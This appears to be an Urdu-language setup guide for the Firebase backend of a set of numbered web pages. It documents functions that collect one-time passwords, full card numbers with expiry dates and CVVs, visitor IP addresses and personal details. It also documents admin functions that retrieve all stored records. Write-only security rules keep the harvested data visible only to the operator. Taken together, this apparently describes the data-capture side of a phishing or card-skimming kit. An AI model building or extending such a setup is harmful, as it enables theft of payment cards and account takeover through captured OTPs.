# Firebase Central Configuration - استعمال کی رہنمائی

## فائلوں کی تفصیل

### 📄 firebase-config.js
یہ **main file** ہے جہاں تمام Firebase changes اک جگہ ہیں۔ اس میں:
- Firebase configuration
- تمام functions (OTP, Card, User Info)
- Data verification functions
- Data retrieval functions (Admin کے لیے)

---

## کیسے استعمال کریں؟

### Step 1: Firebase Setup
`firebase-config.js` کو کھولیں اور اپنی Firebase credentials ڈالیں:

```javascript
const firebaseConfig = {
    apiKey: "YOUR_API_KEY",           // یہاں اپنی API key ڈالیں
    authDomain: "YOUR_AUTH_DOMAIN",   // Firebase auth domain
    projectId: "YOUR_PROJECT_ID",     // Project ID
    storageBucket: "YOUR_STORAGE_BUCKET",
    messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
    appId: "YOUR_APP_ID"
};
```

### Step 2: HTML Files میں Script شامل کریں

ہر HTML file میں یہ تینوں scripts شامل کریں:

```html
<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js"></script>
<script src="firebase-config.js"></script>
```

---

## موجودہ Functions

### 1️⃣ OTP Verification (6.html)
```javascript
sendOTPToFirebase(otp)
```
- OTP کو Firebase میں save کرتا ہے
- Return: `{ success: true, docId: "..." }`

### 2️⃣ Card Authentication (4.html)
```javascript
saveCardAuthenticationToFirebase({
    name: "John Doe",
    cardNumber: "1234567890123456",
    expiry: "12/25",
    cvv: "123"
})
```
- Card data کو Firebase میں save کرتا ہے
- IP address بھی save ہوتا ہے

### 3️⃣ User Information
```javascript
saveUserInfoToFirebase({
    name: "John Doe",
    email: "john@example.com",
    phone: "+92...",
    dateOfBirth: "1990-01-01",
    totalLimit: 50000,
    availableLimit: 45000
})
```

### 4️⃣ OTP Verification Status Update
```javascript
verifyOTP(docId, isVerified)
```

### 5️⃣ Card Verification Status Update
```javascript
verifyCard(docId, isValid)
```

---

## Admin Functions

اگر Admin panel بنانا ہے تو یہ functions استعمال کریں:

### تمام OTP Records حاصل کریں:
```javascript
getAllOTPVerifications().then(data => {
    console.log(data);
});
```

### تمام Card Records حاصل کریں:
```javascript
getAllCardAuthentications().then(data => {
    console.log(data);
});
```

### تمام User Information حاصل کریں:
```javascript
getAllUserInformation().then(data => {
    console.log(data);
});
```

---

## Firestore میں Data Structure

### otp_verifications Collection:
```json
{
    "otp": "123456",
    "timestamp": "2024-06-20T10:30:00",
    "status": "pending",
    "verified": false,
    "verifiedAt": null
}
```

### card_authentications Collection:
```json
{
    "cardHolderName": "John Doe",
    "cardNumber": "1234567890123456",
    "expiryDate": "12/25",
    "cvv": "123",
    "timestamp": "2024-06-20T10:30:00",
    "status": "submitted",
    "ipAddress": "192.168.1.1",
    "verified": false
}
```

### user_information Collection:
```json
{
    "name": "John Doe",
    "email": "john@example.com",
    "phone": "+92...",
    "dateOfBirth": "1990-01-01",
    "totalLimit": 50000,
    "availableLimit": 45000,
    "timestamp": "2024-06-20T10:30:00",
    "status": "submitted"
}
```

---

## نیا Function شامل کرنے کا طریقہ

اگر کوئی نیا function شامل کرنا ہے تو `firebase-config.js` میں اسے اسی طرح add کریں:

```javascript
// ==========================================
// نیا Function
// ==========================================
async function saveNewDataToFirebase(data) {
    try {
        const docRef = await db.collection("collection_name").add({
            ...data,
            timestamp: new Date()
        });
        return { success: true, docId: docRef.id };
    } catch (error) {
        console.error("Error: ", error);
        return { success: false, error: error.message };
    }
}
```

پھر HTML file میں استعمال کریں:
```javascript
saveNewDataToFirebase(data).then(response => {
    if (response.success) {
        console.log("Data saved!");
    }
});
```

---

## Firestore Security Rules

**Development کے لیے:**
```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if true;
    }
  }
}
```

**Production کے لیے:**
```
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /otp_verifications/{document=**} {
      allow create: if true;
      allow read: if false;
      allow update: if false;
      allow delete: if false;
    }
    match /card_authentications/{document=**} {
      allow create: if true;
      allow read: if false;
      allow update: if false;
      allow delete: if false;
    }
  }
}
```

---

## اہم نکات

✅ **تمام changes ایک ہی file میں ہیں** - firebase-config.js  
✅ **آسانی سے functions شامل کر سکتے ہو**  
✅ **HTML files میں صرف function calls ہیں**  
✅ **Configuration ایک جگہ ہے**  
✅ **Production میں security rules لگائیں**

---

## Testing

Browser console میں یہ command چلاکر test کریں:
```javascript
// Check if Firebase is initialized
console.log(firebase.apps);

// Check collections
db.collection("otp_verifications").get().then(snap => console.log(snap.docs));
```

---

## FAQ

**Q: کیا multiple HTML files میں یہ script استعمال کر سکتا ہوں?**
A: ہاں! بس تینوں scripts شامل کریں اور functions استعمال کریں۔

**Q: IP address کیوں save ہو رہا ہے?**
A: Security کے لیے - کون سے location سے data آیا یہ جاننے کے لیے۔

**Q: کیا credentials hardcode کرنی پڑے گی?**
A: Development میں ہاں، لیکن Production میں environment variables استعمال کریں۔

---

## Support

کسی اور چیز کی ضرورت ہو تو firebase-config.js میں نیا function add کر دو!
